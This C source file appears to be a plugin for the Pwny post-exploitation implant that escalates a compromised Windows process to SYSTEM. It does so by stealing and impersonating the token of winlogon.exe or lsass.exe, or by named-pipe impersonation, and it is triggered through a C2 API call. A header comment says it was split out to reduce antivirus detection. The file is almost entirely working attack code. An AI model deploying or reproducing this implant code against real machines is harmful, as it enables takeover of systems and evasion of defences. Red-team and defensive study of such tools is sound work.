/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Getsystem tab plugin — privilege escalation to SYSTEM.
 *
 * Moved out of the core to reduce AV detection surface.
 * Loaded on demand as a tab DLL.
 */

#ifdef __windows__

#include <pwny/tab_dll.h>

#include <windows.h>
#include <tlhelp32.h>
#include <string.h>

#include <pwny/c2.h>
#include <pwny/log.h>

#define GETSYSTEM_BASE 15

#define GETSYSTEM_ELEVATE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       GETSYSTEM_BASE, \
                       API_CALL)

#define TLV_TYPE_GETSYS_TECHNIQUE TLV_TYPE_CUSTOM(TLV_TYPE_INT, GETSYSTEM_BASE, API_TYPE)

#define GETSYS_TECHNIQUE_TOKEN  0
#define GETSYS_TECHNIQUE_PIPE   1

static int getsystem_is_system(void)
{
    HANDLE hToken;
    BYTE tokenInfo[4096];
    DWORD dwSize;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    PSID systemSid = NULL;
    BOOL isSystem;

    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken))
    {
        return 0;
    }

    if (!GetTokenInformation(hToken, TokenUser, tokenInfo,
                             sizeof(tokenInfo), &dwSize))
    {
        CloseHandle(hToken);
        return 0;
    }

    CloseHandle(hToken);

    if (!AllocateAndInitializeSid(&ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID,
                                  0, 0, 0, 0, 0, 0, 0, &systemSid))
    {
        return 0;
    }

    isSystem = EqualSid(((TOKEN_USER *)tokenInfo)->User.Sid, systemSid);
    FreeSid(systemSid);

    return isSystem ? 1 : 0;
}

static int getsystem_enable_privilege(LPCSTR priv)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        return -1;
    }

    if (!LookupPrivilegeValueA(NULL, priv, &luid))
    {
        CloseHandle(hToken);
        return -1;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);

    return (GetLastError() == ERROR_NOT_ALL_ASSIGNED) ? -1 : 0;
}

static DWORD getsystem_find_system_pid(void)
{
    HANDLE hSnap;
    PROCESSENTRY32 pe32;
    DWORD pid = 0;

    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
    {
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnap, &pe32))
    {
        do
        {
            if (_stricmp(pe32.szExeFile, "winlogon.exe") == 0)
            {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe32));
    }

    if (pid == 0)
    {
        Process32First(hSnap, &pe32);
        do
        {
            if (_stricmp(pe32.szExeFile, "lsass.exe") == 0)
            {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe32));
    }

    CloseHandle(hSnap);
    return pid;
}

static int getsystem_via_token(void)
{
    DWORD sys_pid;
    HANDLE hProcess;
    HANDLE hToken;
    HANDLE hDupToken;

    getsystem_enable_privilege("SeDebugPrivilege");

    sys_pid = getsystem_find_system_pid();
    if (sys_pid == 0)
    {
        log_debug("* Could not find SYSTEM process\n");
        return -1;
    }

    log_debug("* Found SYSTEM process PID: %lu\n", sys_pid);

    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, sys_pid);
    if (hProcess == NULL)
    {
        log_debug("* OpenProcess failed (%lu)\n", GetLastError());
        return -1;
    }

    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken))
    {
        log_debug("* OpenProcessToken failed (%lu)\n", GetLastError());
        CloseHandle(hProcess);
        return -1;
    }

    CloseHandle(hProcess);

    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                          SecurityImpersonation, TokenImpersonation,
                          &hDupToken))
    {
        log_debug("* DuplicateTokenEx failed (%lu)\n", GetLastError());
        CloseHandle(hToken);
        return -1;
    }

    CloseHandle(hToken);

    if (!ImpersonateLoggedOnUser(hDupToken))
    {
        log_debug("* ImpersonateLoggedOnUser failed (%lu)\n", GetLastError());
        CloseHandle(hDupToken);
        return -1;
    }

    CloseHandle(hDupToken);

    if (!getsystem_is_system())
    {
        log_debug("* Token impersonation did not yield SYSTEM\n");
        RevertToSelf();
        return -1;
    }

    log_debug("* Successfully impersonated SYSTEM\n");
    return 0;
}

static DWORD WINAPI getsystem_pipe_client_thread(LPVOID param)
{
    char *pipe_name = (char *)param;
    HANDLE hFile;
    DWORD written;
    char buf[] = "getsystem";

    Sleep(500);

    hFile = CreateFileA(pipe_name, GENERIC_READ | GENERIC_WRITE,
                        0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile != INVALID_HANDLE_VALUE)
    {
        WriteFile(hFile, buf, sizeof(buf), &written, NULL);
        CloseHandle(hFile);
    }

    return 0;
}

static int getsystem_via_pipe(void)
{
    HANDLE hPipe;
    HANDLE hThread;
    HANDLE hToken;
    char pipe_name[256];
    DWORD tid;
    BOOL connected;
    char buf[64];
    DWORD bytes_read;

    getsystem_enable_privilege("SeImpersonatePrivilege");

    _snprintf(pipe_name, sizeof(pipe_name),
              "\\\\.\\pipe\\pwny_%lu", GetCurrentProcessId());

    hPipe = CreateNamedPipeA(
        pipe_name,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        1, 1024, 1024, 0, NULL
    );

    if (hPipe == INVALID_HANDLE_VALUE)
    {
        log_debug("* CreateNamedPipe failed (%lu)\n", GetLastError());
        return -1;
    }

    hThread = CreateThread(NULL, 0, getsystem_pipe_client_thread,
                           pipe_name, 0, &tid);
    if (hThread == NULL)
    {
        CloseHandle(hPipe);
        return -1;
    }

    connected = ConnectNamedPipe(hPipe, NULL) ?
                TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);

    if (!connected)
    {
        WaitForSingleObject(hThread, 5000);
        CloseHandle(hThread);
        CloseHandle(hPipe);
        return -1;
    }

    ReadFile(hPipe, buf, sizeof(buf), &bytes_read, NULL);

    if (!ImpersonateNamedPipeClient(hPipe))
    {
        log_debug("* ImpersonateNamedPipeClient failed (%lu)\n", GetLastError());
        DisconnectNamedPipe(hPipe);
        CloseHandle(hPipe);
        WaitForSingleObject(hThread, 5000);
        CloseHandle(hThread);
        return -1;
    }

    DisconnectNamedPipe(hPipe);
    CloseHandle(hPipe);
    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);

    if (!getsystem_is_system())
    {
        log_debug("* Pipe impersonation did not yield SYSTEM\n");
        RevertToSelf();
        return -1;
    }

    log_debug("* Named pipe impersonation successful\n");
    return 0;
}

static tlv_pkt_t *getsystem_elevate(c2_t *c2)
{
    int technique;
    int result;

    technique = GETSYS_TECHNIQUE_TOKEN;
    tlv_pkt_get_u32(c2->request, TLV_TYPE_GETSYS_TECHNIQUE, &technique);

    switch (technique)
    {
        case GETSYS_TECHNIQUE_TOKEN:
            result = getsystem_via_token();
            break;
        case GETSYS_TECHNIQUE_PIPE:
            result = getsystem_via_pipe();
            break;
        default:
            result = -1;
            break;
    }

    if (result != 0)
    {
        if (technique == GETSYS_TECHNIQUE_TOKEN)
        {
            result = getsystem_via_pipe();
        }
        else
        {
            result = getsystem_via_token();
        }
    }

    if (result == 0)
    {
        return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    }

    return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
}

TAB_DLL_EXPORT void TabInit(api_calls_t **api_calls)
{
    api_call_register(api_calls, GETSYSTEM_ELEVATE, (api_t)getsystem_elevate);
}

#endif
